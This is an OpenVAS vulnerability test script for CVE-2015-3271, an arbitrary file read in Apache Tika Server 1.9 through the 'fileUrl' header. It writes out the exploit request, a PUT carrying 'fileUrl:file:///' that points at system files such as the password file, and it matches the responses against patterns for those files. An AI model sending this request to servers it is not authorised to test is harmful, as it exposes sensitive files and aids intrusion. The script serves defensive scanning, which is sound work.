###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_tika_server_info_disc_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Apache Tika Server 'fileUrl' Header Information Disclosure Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:tika";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.810252");
  script_version("$Revision: 7577 $");
  script_cve_id("CVE-2015-3271");
  script_bugtraq_id(9502);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2016-12-20 17:03:54 +0530 (Tue, 20 Dec 2016)");
  script_name("Apache Tika Server 'fileUrl' Header Information Disclosure Vulnerability");
  script_tag(name:"summary", value:"The host is installed with Apache Tika Server
  and is prone to an information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted http PUT request
  and check whether it is able to read arbitrary file or not.");

  script_tag(name:"insight", value:"The flaw is due to it provides optional 
  functionality to run itself as a web service to allow remote use. When used in 
  this manner, it is possible for a 3rd party to pass a 'fileUrl' header to the 
  Apache Tika Server (tika-server).");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read arbitrary files, this could be used to return sensitive content 
  from the server machine.

  Impact Level: Application");

  script_tag(name:"affected", value:"Apache Tika Server 1.9");

  script_tag(name:"solution", value:"Upgrade to Apache Tika Server 1.10 or later,
  For updates refer to https://tika.apache.org");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");
  script_xref(name : "URL" , value : "http://seclists.org/oss-sec/2015/q3/350");
  script_xref(name : "URL" , value : "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2015-3271");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2015/08/13/5");
  
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_tika_server_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("Apache/Tika/Server/Installed");
  script_require_ports("Services/www", 9998);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

##Variable initialization
report = "";
req = "";
res = "";
url = "";
tikaPort = 0;

# Get HTTP Port
if(!tikaPort = get_app_port(cpe:CPE)){
  exit(0);
}

##Get install location
if(!dir = get_app_location(cpe:CPE, port:tikaPort)){
  exit(0);
}

## construct vulnerable url
if( dir == "/" ) dir = "";

url = dir + '/tika';

files = traversal_files();

foreach file (keys(files))
{
  ## send request and receive response
  req = 'PUT ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + http_host_name(port: tikaPort) + '\r\n' +
        'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
        'Accept: text/plain\r\n' +
        'fileUrl:file:///' + files[file] + '\r\n\r\n';

  res = http_keepalive_send_recv(port: tikaPort, data: req);
 
  ## confirm the exploit worked or not
  if("; for 16-bit app support" >< res || "[boot loader]" >< res ||
     res =~ "root:.*:0:")
  {
    report = report_vuln_url(port:tikaPort, url:url);
    security_message(port:tikaPort, data:report);
    exit(0);
  }
}
